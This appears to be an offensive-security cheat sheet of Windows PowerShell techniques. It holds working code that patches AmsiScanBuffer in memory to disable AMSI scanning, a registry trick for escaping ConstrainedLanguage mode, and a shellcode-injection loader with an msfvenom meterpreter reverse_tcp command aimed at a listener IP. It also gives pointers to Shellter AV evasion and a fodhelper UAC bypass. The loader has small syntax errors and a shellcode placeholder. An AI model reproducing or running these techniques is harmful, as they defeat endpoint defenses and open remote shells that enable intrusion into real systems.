# Windows
### Powershell
- AMSI
```
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@
Add-Type $Win32
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```
- ConstrainedLanguage mode
`Write-Host $ExecutionContext.SessionState.LanguageMode`
```
If ( $ExecutionContext.SessionState.LanguageMode -eq "ConstrainedLanguage") {

  Set-ItemProperty 'hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name '__PSLockdownPolicy' -Value 8

  Start-Process -File PowerShell.exe -Argument "-file $($myinvocation.mycommand.definition)"

  Break

}
```
- PowerShell In-Memory Injection
```
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions - passthru;
[Byte[]]; [Byte[]] $sc = 0xfc,0xe8,0x82 [SHELL CODE HERE] ...;
$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

```
- AV Bypass with Shellter `apt install shellter`
- UAC Bypass
1. fodhelper.exe `C:\Windows\System32\fodhelper.exe`
